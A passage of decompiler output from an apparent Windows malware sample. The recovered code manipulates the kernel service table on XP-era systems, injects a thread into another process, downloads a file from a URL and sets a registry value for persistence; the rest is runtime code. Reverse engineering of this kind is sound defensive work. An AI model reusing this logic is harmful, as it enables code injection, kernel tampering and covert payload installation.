    v6 = v5 + 2;
    if ( (unsigned int)(v5[1] - 8) >> 1 )
      break;
LABEL_8:
    v5 = v6;
    if ( !v6[1] )
      return 0;
  }
  while ( (*(_WORD *)v6 & 0xF000) != 12288 || *v5 + a3[7] + (*(_WORD *)v6 & 0xFFF) != a2 )
  {
    v6 = (_DWORD *)((char *)v6 + 2);
    if ( ++v8 >= (int)((unsigned int)(v5[1] - 8) >> 1) )
      goto LABEL_8;
  }
  return 1;
}

//----- (13141C57) --------------------------------------------------------
int __cdecl sub_13141C57(int a1, int a2, _DWORD *a3)
{
  _DWORD *v3; // ecx
  int v4; // esi
  _DWORD *v5; // esi
  signed int v6; // edi
  _DWORD *v7; // ebx
  _DWORD *v8; // eax
  int v9; // eax
  int v11; // [esp+Ch] [ebp-8h]
  int v12; // [esp+10h] [ebp-4h]

  v3 = a3;
  v4 = a3[34];
  if ( !v4 )
    return 0;
  if ( !a3[35] )
    return 0;
  v5 = (_DWORD *)(a1 + v4);
  if ( !v5[1] )
    return 0;
  while ( 1 )
  {
    v12 = 0;
    v6 = (unsigned int)(v5[1] - 8) >> 1;
    v7 = v5 + 2;
    if ( v6 )
      break;
LABEL_10:
    v5 = v7;
    if ( !v7[1] )
      return 0;
  }
  while ( 1 )
  {
    if ( (*(_WORD *)v7 & 0xF000) == 12288 )
    {
      v8 = (_DWORD *)(a1 + *v5 + (*(_WORD *)v7 & 0xFFF));
      if ( *v8 == a2 + v3[7] && *((_WORD *)v8 - 1) == 1479 )
      {
        v11 = v8[1];
        v9 = sub_13141BDF(a1, v11, v3);
        v3 = a3;
        if ( v9 )
          return v11 - a3[7];
      }
    }
    v7 = (_DWORD *)((char *)v7 + 2);
    if ( ++v12 >= v6 )
      goto LABEL_10;
  }
}

//----- (13141CFF) --------------------------------------------------------
LPVOID __cdecl sub_13141CFF(SIZE_T dwBytes)
{
  LPVOID result; // eax

  if ( hHeap )
    result = HeapAlloc(hHeap, 0, dwBytes);
  else
    result = 0;
  return result;
}

//----- (13141D19) --------------------------------------------------------
int __stdcall StartAddress(LPVOID lpThreadParameter)
{
  DWORD v1; // eax
  HKEY phkResult; // [esp+Ch] [ebp-4h] BYREF

  LoadLibraryA(LibFileName);
  LoadLibraryA(aAdvapi32Dll_0);
  LoadLibraryA(aImghlpDll);
  LoadLibraryA(aShell32Dll);
  LoadLibraryA(aWs232Dll);
  LoadLibraryA(aUrlmonDll_0);
  LoadLibraryA(aWininetDll);
  LoadLibraryA(aWinmmDll);
  LoadLibraryA(aUser32Dll);
  URLDownloadToFileA(0, ValueName, (LPCSTR)Str, 0, 0);
  RegCreateKeyExA(HKEY_LOCAL_MACHINE, SubKey, 0, Class, 0, 2u, 0, &phkResult, 0);
  if ( phkResult )
  {
    v1 = strlen((const char *)Str);
    RegSetValueExA(phkResult, ValueName, 0, 1u, Str, v1);
    RegCloseKey(phkResult);
  }
  return 1;
}

//----- (13141DC8) --------------------------------------------------------
BOOL sub_13141DC8()
{
  HANDLE v0; // eax
  struct _TOKEN_PRIVILEGES NewState; // [esp+0h] [ebp-1Ch] BYREF
  struct _LUID Luid; // [esp+10h] [ebp-Ch] BYREF
  HANDLE TokenHandle; // [esp+18h] [ebp-4h] BYREF

  v0 = GetCurrentProcess();
  OpenProcessToken(v0, 0x28u, &TokenHandle);
  LookupPrivilegeValueA(0, Name, &Luid);
  NewState.Privileges[0].Luid = Luid;
  NewState.PrivilegeCount = 1;
  NewState.Privileges[0].Attributes = 2;
  AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0x10u, 0, 0);
  return CloseHandle(TokenHandle);
}

//----- (13141E2C) --------------------------------------------------------
char sub_13141E2C()
{
  __m128i *v1; // eax
  __int32 *v2; // edi
  int v3; // esi
  int v4; // eax
  int v5; // esi
  int v6; // esi
  unsigned int v7; // eax
  int v8; // ecx
  int v9; // esi
  int v10; // edi
  unsigned int v11; // ebx
  int v12; // esi
  __m128i *v13; // eax
  _DWORD *v14; // ebx
  int v15; // eax
  __m128i *v16; // esi
  unsigned int v17; // edi
  _DWORD *v18; // eax
  int v19; // esi
  int v20; // ecx
  _DWORD v21[7]; // [esp+0h] [ebp-178h] BYREF
  int v22; // [esp+1Ch] [ebp-15Ch]
  char v23[24]; // [esp+E0h] [ebp-98h] BYREF
  int v24; // [esp+F8h] [ebp-80h]
  int v25; // [esp+FCh] [ebp-7Ch] BYREF
  __m128i *v26; // [esp+100h] [ebp-78h]
  unsigned int v27; // [esp+104h] [ebp-74h]
  int v28; // [esp+108h] [ebp-70h] BYREF
  LPVOID v29; // [esp+10Ch] [ebp-6Ch]
  int v30; // [esp+110h] [ebp-68h] BYREF
  int v31; // [esp+114h] [ebp-64h] BYREF
  char v32[64]; // [esp+118h] [ebp-60h] BYREF
  struct _OSVERSIONINFOA VersionInformation; // [esp+158h] [ebp-20h] BYREF

  VersionInformation.dwOSVersionInfoSize = 148;
  GetVersionExA(&VersionInformation);
  if ( VersionInformation.dwMajorVersion != 5
    || VersionInformation.dwMinorVersion && VersionInformation.dwMinorVersion != 1 )
  {
    return 1;
  }
  dword_13144028 = VersionInformation.dwMinorVersion;
  if ( !sub_131418AE() )
    return 1;
  sub_13141A19();
  v29 = (LPVOID)sub_1314195D();
  if ( v29 == (LPVOID)-1 )
  {
    v29 = (LPVOID)sub_1314195D();
    if ( v29 == (LPVOID)-1 )
      return 1;
  }
  v1 = sub_131415DD(String2);
  v2 = (__int32 *)v1;
  v26 = v1;
  if ( !v1 )
    return 1;
  v3 = sub_1314177C((int)v1, aKeservicedescr);
  v24 = v3;
  if ( !v3 || !sub_13141492(v2, v32, v23, v21, &v25) )
    return 1;
  v4 = sub_13141B39();
  v31 = 0;
  v4 += 0x80000000;
  v28 = v3 + v4;
  v5 = v3 + v4;
  v25 = v4 - v22;
  v30 = 0x2000;
  if ( !sub_131419C3((int)v29, &v28, &v30, &v31) )
    return 0;
  v6 = v5 - v28;
  v7 = v30 - v6;
  if ( (unsigned int)(v30 - v6) < 4 )
    return 1;
  v8 = v6 + v31;
  v9 = *(_DWORD *)(v6 + v31);
  if ( v7 >= 0xC )
    v27 = *(_DWORD *)(v8 + 8);
  sub_13141A0C(v31);
  if ( v27 >= 0x12C )
    return 1;
  v31 = 0;
  v10 = v9 + 0x80000000;
  v28 = v9 + 0x80000000;
  v30 = 0x2000;
  if ( sub_131419C3((int)v29, &v28, &v30, &v31) )
  {
    v11 = v27;
    v12 = v10 - v28;
    if ( (unsigned int)(v30 - (v10 - v28)) >> 2 >= v27 )
    {
      v29 = sub_13141CFF(4 * v27);
      if ( v29 )
      {
        v13 = sub_131415DD(aNtdllDll_0);
        if ( v13 )
        {
          sub_131417F3((int)v13, (int)v29, v11);
          v14 = (_DWORD *)(v12 + v31);
          v15 = sub_13141C57((int)v26, v24, v21);
          v16 = (__m128i *)((char *)v26 + v15);
          if ( &v26->m128i_i8[v15] )
          {
            if ( &v26->m128i_i8[v10 - v22 - v25] != (__int8 *)v16
              && !IsBadReadPtr(&v26->m128i_i8[v15], 4u)
              && !IsBadReadPtr((char *)v16 + 4 * v27 - 4, 4u) )
            {
              v17 = v27;
              if ( v27 )
              {
                v18 = v14;
                v19 = (char *)v16 - (char *)v14;
                do
                {
                  v20 = *(_DWORD *)((char *)v18 + v19);
                  if ( *v18 - v25 + 0x80000000 != v20 )
                    *v18 = v20 + v25 + 0x80000000;
                  ++v18;
                  --v17;
                }
                while ( v17 );
              }
            }
          }
          sub_13141A0C(v31);
          return 0;
        }
      }
      return 1;
    }
  }
  return 0;
}
// 13144028: using guessed type int dword_13144028;

//----- (13142093) --------------------------------------------------------
int __stdcall start(int a1, int a2, int a3, int a4)
{
  DWORD v4; // eax
  HANDLE v5; // eax

  sub_13141DC8();
  sub_13141E2C();
  v4 = sub_13141340(String1);
  v5 = OpenProcess(0x1F0FFFu, 0, v4);
  sub_131413D7(v5, (LPTHREAD_START_ROUTINE)StartAddress);
  return 0;
}

//----- (131420F0) --------------------------------------------------------
// positive sp value has been detected, the output may be wrong!
__m128i *__cdecl sub_131420F0(__m128i *a1, __m128i *a2, unsigned int a3)
{
  __m128i *v3; // esi
  _BYTE *v4; // edi
  __m128i *result; // eax
  unsigned int v6; // ecx
  int v7; // esi
  int v8; // edi
  unsigned int v9; // ecx

  v3 = a2;
  v4 = a1;
  if ( a1 > a2 && a1 < (__m128i *)&a2->m128i_i8[a3] )
  {
    v7 = (int)&a2->m128i_i32[-1] + a3;
    v8 = (int)&a1->m128i_i32[-1] + a3;
    if ( (v8 & 3) == 0 )
    {
      v9 = a3 >> 2;
      if ( a3 >> 2 >= 8 )
      {
        while ( v9 )
        {
          *(_DWORD *)v8 = *(_DWORD *)v7;
          v7 -= 4;
          v8 -= 4;
          --v9;
        }
        switch ( a3 & 3 )
        {
          case 0u:
            goto LABEL_36;
          case 1u:
            goto LABEL_37;
          case 2u:
            goto LABEL_38;
          case 3u:
            goto LABEL_39;
        }
      }
      switch ( a3 & 3 )
      {
        case 0u:
          goto LABEL_36;
        case 1u:
          goto LABEL_37;
        case 2u:
          goto LABEL_38;
        case 3u:
          goto LABEL_39;
      }
    }
    switch ( a3 )
    {
      case 0u:
LABEL_36:
        result = a1;
        break;
      case 1u:
LABEL_37:
        *(_BYTE *)(v8 + 3) = *(_BYTE *)(v7 + 3);
        result = a1;
        break;
      case 2u:
LABEL_38:
        *(_BYTE *)(v8 + 3) = *(_BYTE *)(v7 + 3);
        *(_BYTE *)(v8 + 2) = *(_BYTE *)(v7 + 2);
        result = a1;
        break;
      case 3u:
LABEL_39:
        *(_BYTE *)(v8 + 3) = *(_BYTE *)(v7 + 3);
        *(_BYTE *)(v8 + 2) = *(_BYTE *)(v7 + 2);
        *(_BYTE *)(v8 + 1) = *(_BYTE *)(v7 + 1);
        result = a1;
        break;
      default:
        __asm { jmp     dword ptr ds:loc_13142300+4[eax*4] }
        return result;
    }
  }
  else if ( a3 >= 0x100
         && dword_13144378
         && (v3 = a2, v4 = a1, ((unsigned __int8)a1 & 0xF) == ((unsigned __int8)a2 & 0xF)) )
  {
    result = unknown_libname_248(a1, a2, a3);
  }
  else
  {
    if ( ((unsigned __int8)v4 & 3) != 0 )
    {
      if ( a3 >= 4 )
        __asm { jmp     dword ptr ds:loc_13142174+4[eax*4] }
      __asm { jmp     dword ptr ds:loc_13142274[ecx*4]; jumptable 1314214C case 0 }
    }
    v6 = a3 >> 2;
    switch ( v6 )
    {
      case 0u:
        goto LABEL_21;
      case 1u:
        goto LABEL_20;
      case 2u:
        goto LABEL_19;
      case 3u:
        goto LABEL_18;
      case 4u:
        goto LABEL_17;
      case 5u:
        goto LABEL_16;
      case 6u:
        goto LABEL_15;
      case 7u:
        *(_DWORD *)&v4[4 * v6 - 28] = *((_DWORD *)&v3[-1] + v6 - 3);
LABEL_15:
        *(_DWORD *)&v4[4 * v6 - 24] = *((_DWORD *)&v3[-1] + v6 - 2);
LABEL_16:
        *(_DWORD *)&v4[4 * v6 - 20] = *((_DWORD *)&v3[-1] + v6 - 1);
LABEL_17:
        *(_DWORD *)&v4[4 * v6 - 16] = v3[-1].m128i_i32[v6];
LABEL_18:
        *(_DWORD *)&v4[4 * v6 - 12] = v3->m128i_i32[v6 - 3];
LABEL_19:
        *(_DWORD *)&v4[4 * v6 - 8] = v3->m128i_i32[v6 - 2];
LABEL_20:
        *(_DWORD *)&v4[4 * v6 - 4] = v3->m128i_i32[v6 - 1];
        v3 = (__m128i *)((char *)v3 + 4 * v6);
        v4 += 4 * v6;
LABEL_21:
        switch ( a3 & 3 )
        {
          case 0u:
            goto LABEL_22;
          case 1u:
            goto LABEL_23;
          case 2u:
            goto LABEL_24;
          case 3u:
            goto LABEL_25;
        }
      default:
        qmemcpy(v4, v3, 4 * v6);
        v3 = (__m128i *)((char *)v3 + 4 * v6);
        v4 += 4 * v6;
        switch ( a3 & 3 )
        {
          case 0u:
LABEL_22:
            result = a1;
            break;
          case 1u:
LABEL_23:
            *v4 = v3->m128i_i8[0];
            result = a1;
            break;
          case 2u:
LABEL_24:
            *v4 = v3->m128i_i8[0];
            v4[1] = v3->m128i_i8[1];
            result = a1;
            break;
          case 3u:
LABEL_25:
            *v4 = v3->m128i_i8[0];
            v4[1] = v3->m128i_i8[1];
            v4[2] = v3->m128i_i8[2];
            result = a1;
            break;
        }
        break;
    }
  }
  return result;
}
// 13142307: positive sp value 14 has been found
// 13144378: using guessed type int dword_13144378;

//----- (13142460) --------------------------------------------------------
// 22
size_t __cdecl strlen(const char *Str)
{
  const char *v1; // ecx
  int v3; // eax
  int v4; // eax

  v1 = Str;
  if ( ((unsigned __int8)Str & 3) == 0 )
    goto LABEL_4;
  do
  {
    if ( !*v1++ )
      return v1 - 1 - Str;
  }
  while ( ((unsigned __int8)v1 & 3) != 0 );
  while ( 1 )
  {
    do
    {
LABEL_4:
      v3 = (*(_DWORD *)v1 + 2130640639) ^ ~*(_DWORD *)v1;
      v1 += 4;
    }
    while ( (v3 & 0x81010100) == 0 );
    v4 = *((_DWORD *)v1 - 1);
    if ( !(_BYTE)v4 )
      break;
    if ( !BYTE1(v4) )
      return v1 - 3 - Str;
    if ( (v4 & 0xFF0000) == 0 )
      return v1 - 2 - Str;
    if ( (v4 & 0xFF000000) == 0 )
      return v1 - 1 - Str;
  }
  return v1 - 4 - Str;
}

//----- (131424EB) --------------------------------------------------------
void __cdecl __noreturn __report_gsfailure()
{
  int v0; // eax
  int v1; // edx
  int v2; // ecx
  int v3; // ebx
  int v4; // edi
  int v5; // esi
  unsigned int v6; // kr00_4
  HANDLE v7; // eax
  int vars0; // [esp+328h] [ebp+0h]
  int retaddr; // [esp+32Ch] [ebp+4h]
  char v10; // [esp+330h] [ebp+8h] BYREF

  dword_13144150 = v0;
  dword_1314414C = v2;
  dword_13144148 = v1;
  dword_13144144 = v3;
  dword_13144140 = v5;
  dword_1314413C = v4;
  word_13144168 = __SS__;
  word_1314415C = __CS__;
  word_13144138 = __DS__;
  word_13144134 = __ES__;
  word_13144130 = __FS__;
  word_1314412C = __GS__;
  v6 = __readeflags();
  dword_13144160 = v6;
  dword_13144154 = vars0;
  dword_13144158 = retaddr;
  dword_13144164 = (int)&v10;
  dword_131440A0 = 65537;
  dword_13144054 = retaddr;
  dword_13144048 = -1073740791;
  dword_1314404C = 1;
  dword_13144098 = IsDebuggerPresent();
  sub_1314276D();
  SetUnhandledExceptionFilter(0);
  UnhandledExceptionFilter(&ExceptionInfo);
  if ( !dword_13144098 )
    sub_1314276D();
  v7 = GetCurrentProcess();
  TerminateProcess(v7, 0xC0000409);
}
// 131424F4: variable 'v0' is possibly undefined
// 131424F9: variable 'v2' is possibly undefined
// 131424FF: variable 'v1' is possibly undefined
// 13142505: variable 'v3' is possibly undefined
// 1314250B: variable 'v5' is possibly undefined
// 13142511: variable 'v4' is possibly undefined
// 1314254B: variable 'vars0' is possibly undefined
// 13144048: using guessed type int dword_13144048;
// 1314404C: using guessed type int dword_1314404C;
// 13144054: using guessed type int dword_13144054;
// 13144098: using guessed type int dword_13144098;
// 131440A0: using guessed type int dword_131440A0;
// 1314412C: using guessed type __int16 word_1314412C;
// 13144130: using guessed type __int16 word_13144130;
// 13144134: using guessed type __int16 word_13144134;
// 13144138: using guessed type __int16 word_13144138;
// 1314413C: using guessed type int dword_1314413C;
// 13144140: using guessed type int dword_13144140;
// 13144144: using guessed type int dword_13144144;
// 13144148: using guessed type int dword_13144148;
// 1314414C: using guessed type int dword_1314414C;
// 13144150: using guessed type int dword_13144150;
// 13144154: using guessed type int dword_13144154;
// 13144158: using guessed type int dword_13144158;
// 1314415C: using guessed type __int16 word_1314415C;
// 13144160: using guessed type int dword_13144160;
// 13144164: using guessed type int dword_13144164;
// 13144168: using guessed type __int16 word_13144168;

//----- (131425EF) --------------------------------------------------------
void __cdecl fastcopy_I(__m128i *a1, const __m128i *a2, unsigned int a3)
{
  unsigned int v5; // ecx
  __m128i v6; // xmm1
  __m128i v7; // xmm2
  __m128i v8; // xmm3
  __m128i v9; // xmm5
  __m128i v10; // xmm6
  __m128i v11; // xmm7

  v5 = a3 >> 7;
  do
  {
    v6 = _mm_load_si128(a2 + 1);
    v7 = _mm_load_si128(a2 + 2);
    v8 = _mm_load_si128(a2 + 3);
    *a1 = _mm_load_si128(a2);
    a1[1] = v6;
    a1[2] = v7;
    a1[3] = v8;
    v9 = _mm_load_si128(a2 + 5);
    v10 = _mm_load_si128(a2 + 6);
    v11 = _mm_load_si128(a2 + 7);
    a1[4] = _mm_load_si128(a2 + 4);
    a1[5] = v9;
    a1[6] = v10;
    a1[7] = v11;
    a2 += 8;
    a1 += 8;
    --v5;
  }
  while ( v5 );
}

//----- (13142676) --------------------------------------------------------
// Microsoft VisualC 2-8/net runtime
__m128i *__cdecl unknown_libname_248(__m128i *a1, const __m128i *a2, unsigned int a3)
{
  int v3; // ecx
  __m128i *result; // eax
  int v5; // ecx
  unsigned int v6; // [esp+4h] [ebp-18h]

  v3 = (int)a2 % 16;
  result = a1;
  if ( ((int)a1 % 16) | ((int)a2 % 16) )
  {
    if ( v3 == (int)a1 % 16 )
    {
      qmemcpy(a1, a2, 16 - v3);
      unknown_libname_248(&a1->m128i_i8[16 - v3], &a2->m128i_i8[16 - v3], a3 - (16 - v3));
    }
    else
    {
      qmemcpy(a1, a2, a3);
    }
    result = a1;
  }
  else
  {
    v5 = a3 & 0x7F;
    v6 = v5;
    if ( a3 != v5 )
    {
      fastcopy_I(a1, a2, a3 - v5);
      result = a1;
      v5 = v6;
    }
    if ( v5 )
    {
      qmemcpy(&result->m128i_i8[a3 - v5], &a2->m128i_i8[a3 - v5], v6);
      result = a1;
    }
  }
  return result;
}

//----- (13142759) --------------------------------------------------------
int sub_13142759()
{
  dword_13144374 = 0;
  dword_13144374 = unknown_libname_274();
  return 0;
}
// 13144374: using guessed type int dword_13144374;

//----- (1314276D) --------------------------------------------------------
void sub_1314276D()
{
  dword_13144370 = 0;
}
// 13144370: using guessed type int dword_13144370;

//----- (13142775) --------------------------------------------------------
int has_osfxsr_set()
{
  return 1;
}

//----- (131427C5) --------------------------------------------------------
// Microsoft VisualC 2-8/net runtime
BOOL unknown_libname_274()
{
  unsigned int v0; // kr00_4
  unsigned int v1; // kr04_4
  int v13; // [esp+18h] [ebp-4h]

  v13 = 0;
  v0 = __readeflags();
  __writeeflags(v0 ^ 0x200000);
  v1 = __readeflags();
  if ( v1 != v0 )
  {
    __writeeflags(v0);
    _EAX = 0;
    __asm { cpuid }
    _EAX = 1;
    __asm { cpuid }
    v13 = _EDX;
  }
  return (v13 & 0x4000000) != 0 && has_osfxsr_set();
}

//----- (13142825) --------------------------------------------------------
int sub_13142825()
{
  dword_13144378 = unknown_libname_274();
  return 0;
}
// 13144378: using guessed type int dword_13144378;

//----- (13142890) --------------------------------------------------------
int __cdecl _except_handler4(int a1, PVOID TargetFrame, int a3)
{
  uintptr_t v3; // esi
  char *v4; // edi
  unsigned int v5; // ebp
  int (*v6)(void); // ecx
  unsigned int *v7; // ebx
  unsigned int v8; // eax
  int v9; // eax
  _DWORD *v11; // eax
  int v12; // esi
  unsigned int v13; // [esp+14h] [ebp-10h]
  int v14; // [esp+18h] [ebp-Ch]
  int v15[2]; // [esp+1Ch] [ebp-8h] BYREF

  v3 = __security_cookie ^ *((_DWORD *)TargetFrame + 2);
  v14 = 1;
  v4 = (char *)TargetFrame + 16;
  if ( (*(_BYTE *)(a1 + 4) & 0x66) != 0 )
  {
    if ( *((_DWORD *)TargetFrame + 3) != -2 )
      sub_13142B64((int)TargetFrame, 0xFFFFFFFE, (int)TargetFrame + 16, &__security_cookie);
  }
  else
  {
    v5 = *((_DWORD *)TargetFrame + 3);
    v15[0] = a1;
    v15[1] = a3;
    *((_DWORD *)TargetFrame - 1) = v15;
    if ( v5 != -2 )
    {
      do
      {
        v6 = *(int (**)(void))(v3 + 12 * v5 + 20);
        v7 = (unsigned int *)(v3 + 12 * v5 + 16);
        v8 = *v7;
        v13 = *v7;
        if ( v6 )
        {
          v9 = sub_13142B1A(v6);
          if ( v9 < 0 )
            return 0;
          if ( v9 > 0 )
          {
            if ( *(_DWORD *)a1 == -529697949 && dword_1314436C && sub_13142BF2((int)&dword_1314436C) )
              dword_1314436C(a1, 1);
            sub_13142B4A(TargetFrame);
            v11 = TargetFrame;
            if ( *((_DWORD *)TargetFrame + 3) != v5 )
            {
              sub_13142B64((int)TargetFrame, v5, (int)v4, &__security_cookie);
              v11 = TargetFrame;
            }
            v11[3] = v13;
            v12 = *(_DWORD *)(v3 + 12 * v5 + 24);
            sub_13142D75(v7[2], (int)v4, 1);
            __asm { jmp     esi }
          }
          v8 = v13;
        }
        v5 = v8;
      }
      while ( v8 != -2 );
    }
  }
  return v14;
}
// 1314436C: using guessed type int (__cdecl *dword_1314436C)(_DWORD, _DWORD);

//----- (13142A28) --------------------------------------------------------
// 3
int __usercall _local_unwind4_0@<eax>(int a1@<ebp>, _DWORD *a2, int a3, unsigned int a4)
{
  int result; // eax
  unsigned int v5; // esi
  int v6; // esi
  int v7; // ebx

  while ( 1 )
  {
    result = a3;
    v5 = *(_DWORD *)(a3 + 12);
    if ( v5 == -2 || a4 != -2 && v5 <= a4 )
      break;
    v6 = 3 * v5;
    v7 = (*a2 ^ *(_DWORD *)(a3 + 8)) + 4 * v6 + 16;
    *(_DWORD *)(a3 + 12) = *(_DWORD *)((*a2 ^ *(_DWORD *)(a3 + 8)) + 4 * v6 + 0x10);
    if ( !*(_DWORD *)(v7 + 4) )
    {
      sub_13142D75(*(_DWORD *)(v7 + 8), a1, 257);
      sub_13142D94(*(int (**)(void))(v7 + 8));
    }
  }
  return result;
}

//----- (13142AB8) --------------------------------------------------------
int __cdecl _unwind_handler4(int a1, _DWORD *a2, int a3, _DWORD *a4)
{
  int result; // eax

  result = 1;
  if ( (*(_DWORD *)(a1 + 4) & 6) != 0 )
  {
    _local_unwind4_0(a2[6], (_DWORD *)a2[5], a2[4], a2[3]);
    *a4 = a2;
    result = 3;
  }
  return result;
}

//----- (13142B1A) --------------------------------------------------------
int __thiscall sub_13142B1A(int (*this)(void))
{
  return this();
}

//----- (13142B4A) --------------------------------------------------------
void __thiscall sub_13142B4A(PVOID TargetFrame)
{
  RtlUnwind(TargetFrame, &loc_13142B5F, 0, 0);
}

//----- (13142B64) --------------------------------------------------------
int __fastcall sub_13142B64(int a1, unsigned int a2, int a3, _DWORD *a4)
{
  return _local_unwind4_0(a3, a4, a1, a2);
}

//----- (13142B80) --------------------------------------------------------
BOOL __cdecl _ValidateImageBase(int a1)
{
  BOOL result; // eax
  int v2; // eax

  if ( *(_WORD *)a1 == 23117 && (v2 = a1 + *(_DWORD *)(a1 + 60), *(_DWORD *)v2 == 17744) )
    result = *(_WORD *)(v2 + 24) == 267;
  else
    result = 0;
  return result;
}

//----- (13142BB0) --------------------------------------------------------
int __cdecl _FindPESection(int a1, unsigned int a2)
{
  int v2; // ecx
  unsigned int v3; // esi
  unsigned int v4; // edx
  int result; // eax
  unsigned int v6; // ecx

  v2 = a1 + *(_DWORD *)(a1 + 60);
  v3 = *(unsigned __int16 *)(v2 + 6);
  v4 = 0;
  result = *(unsigned __int16 *)(v2 + 20) + v2 + 24;
  if ( !*(_WORD *)(v2 + 6) )
    return 0;
  while ( 1 )
  {
    v6 = *(_DWORD *)(result + 12);
    if ( a2 >= v6 && a2 < v6 + *(_DWORD *)(result + 8) )
      break;
    ++v4;
    result += 40;
    if ( v4 >= v3 )
      return 0;
  }
  return result;
}

//----- (13142BF2) --------------------------------------------------------
BOOL __cdecl sub_13142BF2(int a1)
{
  int v1; // edx
  int v2; // eax
  BOOL result; // eax

  if ( _ValidateImageBase(320077824) && (v2 = _FindPESection(v1, a1 - v1)) != 0 )
    result = *(int *)(v2 + 36) >= 0;
  else
    result = 0;
  return result;
}
// 13142C19: variable 'v1' is possibly undefined

//----- (13142C80) --------------------------------------------------------
int __cdecl __spoils<eax,ecx,edx> _unwind_handler(int a1, int a2, int a3, _DWORD *a4, int a5)
{
  int result; // eax

  result = 1;
  if ( (*(_DWORD *)(a1 + 4) & 6) != 0 )
  {
    _local_unwind2(*(_DWORD *)(a5 + 36), *(_DWORD *)(a5 + 40));
    *a4 = a2;
    result = 3;
  }
  return result;
}

//----- (13142CC5) --------------------------------------------------------
int __cdecl __spoils<eax,ecx,edx> _local_unwind2(int a1, unsigned int a2)
{
  int v2; // ebp
  int result; // eax
  int v4; // ebx
  unsigned int v5; // esi
  int v6; // esi

  while ( 1 )
  {
    result = a1;
    v4 = *(_DWORD *)(a1 + 8);
    v5 = *(_DWORD *)(a1 + 12);
    if ( v5 == -1 || a2 != -1 && v5 <= a2 )
      break;
    v6 = 3 * v5;
    *(_DWORD *)(a1 + 12) = *(_DWORD *)(v4 + 4 * v6);
    if ( !*(_DWORD *)(v4 + 4 * v6 + 4) )
    {
      sub_13142D75(*(_DWORD *)(v4 + 4 * v6 + 8), v2, 257);
      sub_13142D94(*(int (**)(void))(v4 + 4 * v6 + 8));
    }
  }
  return result;
}
// 13142D27: variable 'v2' is possibly undefined

//----- (13142D75) --------------------------------------------------------
int __userpurge sub_13142D75@<eax>(int result@<eax>, int a2@<ebp>, int a3)
{
  dword_13144010[2] = a3;
  dword_13144010[1] = result;
  dword_13144010[3] = a2;
  return result;
}

//----- (13142D94) --------------------------------------------------------
int __usercall sub_13142D94@<eax>(int (*a1)(void)@<eax>)
{
  return a1();
}

// nfuncs=55 queued=47 decompiled=47 lumina nreq=0 worse=0 better=0
// ALL OK, 47 function(s) have been successfully decompiled
